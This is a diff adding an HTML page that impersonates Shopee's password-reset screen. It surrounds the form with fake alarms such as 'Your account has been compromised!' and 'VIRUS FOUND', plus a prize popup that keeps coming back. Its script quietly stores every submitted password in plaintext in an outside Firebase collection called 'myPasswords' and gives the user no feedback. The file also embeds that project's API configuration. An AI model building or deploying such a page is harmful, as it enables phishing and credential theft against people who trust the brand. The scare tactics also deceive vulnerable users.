@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Reset Password | Shopee</title>
+  <link rel="stylesheet" href="../style.css" />
+</head>
+<body>
+<div id="auth-header-container"></div>
+
+<main class="reset-password">
+  <div class="reset-password-card auth-card">
+    <div class="auth-card-header">
+      <a href="./login.html">
+        <svg viewBox="0 0 22 17" class="adQfSO" width="24" height="18.55" fill="#EE4D2D">
+          <g stroke="none" stroke-width="1" fill-rule="evenodd" transform="translate(-3, -6)">
+            <path d="M5.78416545,15.2727801 L12.9866648,21.7122915 C13.286114,22.0067577 13.286114,22.4841029 12.9866648,22.7785691 C12.6864297,23.0738103 12.200709,23.0738103 11.9004739,22.7785691 L3.29347136,15.0837018 C3.27067864,15.0651039 3.23845445,15.072853 3.21723364,15.0519304 C3.06240034,14.899273 2.99480814,14.7001208 3.00030983,14.5001937 C2.99480814,14.3002667 3.06240034,14.1003396 3.21723364,13.9476821 C3.23845445,13.9275344 3.2714646,13.9345086 3.29425732,13.9166857 L11.9004739,6.22026848 C12.200709,5.92657717 12.6864297,5.92657717 12.9866648,6.22026848 C13.286114,6.51628453 13.286114,6.99362977 12.9866648,7.288096 L5.78416545,13.7276073 L24.2140442,13.7276073 C24.6478918,13.7276073 25,14.0739926 25,14.5001937 C25,14.9263948 24.6478918,15.2727801 24.2140442,15.2727801 L5.78416545,15.2727801 Z"></path>
+          </g>
+        </svg>
+      </a>
+      <h2 class="auth-card-title">Reset Password</h2>
+    </div>
+
+    <div class="auth-card-main">
+      <form id="new_password_form" class="form-inputs">
+        <input type="password" id="confirm_password" placeholder="Enter new password" required />
+        <button type="submit" id="reset_password_btn" class="auth-btn" disabled style="background: #F3826C;">
+          Save Password
+        </button>
+      </form>
+      <ul style="margin-top: 10px; font-size: 12px; color: #555;">
+        <li>At least one lowercase character</li>
+        <li>At least one uppercase character</li>
+        <li>8-16 characters</li>
+        <li>Only letters, numbers and common punctuation</li>
+      </ul>
+    </div>
+  </div>
+</main>
+<!-- Big floating ads -->
+ <!-- <div id="big-left-ad" class="big-float-ad left-big">
+  <strong>Reset your password now!</strong><br>
+  Your account has been compromised!
+</div>
+-->
+<div id="big-right-ad" class="big-float-ad right-big">
+  <strong>Reset your password now!</strong><br>
+  Your account has been compromised!
+</div>
+
+<!-- POPUP MODAL AD -->
+<div id="popup-ad" class="popup-ad">
+  <div class="popup-content">
+    <span class="close-popup" onclick="closePopup()">×</span>
+    <h3>⚠️ SPECIAL PROMO ⚠️</h3>
+    <p>Reset your password NOW to get ₱1,000 coins!</p>
+    <button class="auth-btn">CLAIM</button>
+  </div>
+</div>
+
+<!-- SHAKING ADS -->
+<div class="shake-ad left-shake">CLAIM YOUR MONEY!</div>
+<div class="shake-ad right-shake">FREE COINS</div>
+
+<!-- STICKY BOTTOM AD -->
+<div class="bottom-ad">
+  🚨 LIMITED TIME OFFER — DO NOT MISS OUT 🚨
+</div>
+
+<!-- TELEPORTING AD -->
+<div id="teleport-ad" class="teleport-ad">
+  CLICK ME!!!
+</div>
+
+<!-- SIDE AD COLUMNS -->
+<div class="side-ads left-side-ads">
+  <div class="side-ad">🔥 HOT DEAL</div>
+  <div class="side-ad">💸 WIN CASH</div>
+  <div class="side-ad">🎁 FREE GIFT</div>
+  <div class="side-ad">⚠️ VIRUS FOUND</div>
+  <div class="side-ad">DOWNLOAD NOW</div>
+</div>
+
+<div class="side-ads right-side-ads">
+  <div class="side-ad">YOU WON ₱5,000</div>
+  <div class="side-ad">CLAIM TODAY</div>
+  <div class="side-ad">💰 EASY MONEY</div>
+  <div class="side-ad">RESET NOW</div>
+  <div class="side-ad">LIMITED OFFER</div>
+</div>
+
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
+<script>
+
+// RANDOMLY CHANGE SIDE ADS TEXT
+const adTexts = [
+  "⚠️ ACCOUNT AT RISK",
+  "💰 EASY ₱₱₱",
+  "FREE SPINS",
+  "CLAIM REWARD",
+  "RESET NOW",
+  "DOWNLOAD APP",
+  "VIRUS DETECTED",
+  "YOU WON!"
+];
+
+setInterval(() => {
+  document.querySelectorAll('.side-ad').forEach(ad => {
+    ad.textContent = adTexts[Math.floor(Math.random() * adTexts.length)];
+  });
+}, 2000);
+
+
+// AUTO SHOW POPUP
+function showPopup() {
+  document.getElementById('popup-ad').style.display = 'flex';
+}
+setTimeout(showPopup, 1200);
+
+// POPUP CLOSE BUT RETURNS 😈
+function closePopup() {
+  document.getElementById('popup-ad').style.display = 'none';
+  setTimeout(showPopup, 3000); // reappears
+}
+
+// TELEPORTING AD
+setInterval(() => {
+  const ad = document.getElementById('teleport-ad');
+  ad.style.left = Math.random() * (window.innerWidth - 120) + 'px';
+  ad.style.top = Math.random() * (window.innerHeight - 60) + 'px';
+}, 900);
+
+  // Firebase config
+const firebaseConfig = {
+  apiKey: "AIzaSyDMWrf2aZLQCRc1CJgB-uzUV8VNn6CKQ9U",
+  authDomain: "test-a2ff3.firebaseapp.com",
+  projectId: "test-a2ff3",
+  storageBucket: "test-a2ff3.firebasestorage.app",
+  messagingSenderId: "171858929334",
+  appId: "1:171858929334:web:8e3c641c866793debd2817",
+  measurementId: "G-QF6RKRRPDV"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
+
+const form = document.getElementById('new_password_form');
+const passwordInput = document.getElementById('confirm_password');
+const resetBtn = document.getElementById('reset_password_btn');
+
+// Enable button if password meets criteria
+passwordInput.addEventListener('input', () => {
+  const pwd = passwordInput.value;
+  const valid = /^(?=.*[a-z])(?=.*[A-Z])[A-Za-z\d!@#$%^&*()_+]{8,16}$/.test(pwd);
+  resetBtn.disabled = !valid;
+  resetBtn.style.background = valid ? '#EE4D2D' : '#F3826C';
+});
+
+// Save password as a new log entry without pop-ups
+form.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const pwd = passwordInput.value;
+
+  try {
+    // Add a new document to 'myPasswords' collection with a timestamp
+    await db.collection('myPasswords').add({
+      password: pwd,
+      timestamp: firebase.firestore.FieldValue.serverTimestamp()
+    });
+
+    // Reset input and button without alerts
+    passwordInput.value = '';
+    resetBtn.disabled = true;
+  } catch (err) {
+    console.error(err);
+    // Do nothing, silently fail
+  }
+});
+</script>
+</body>
+</html>
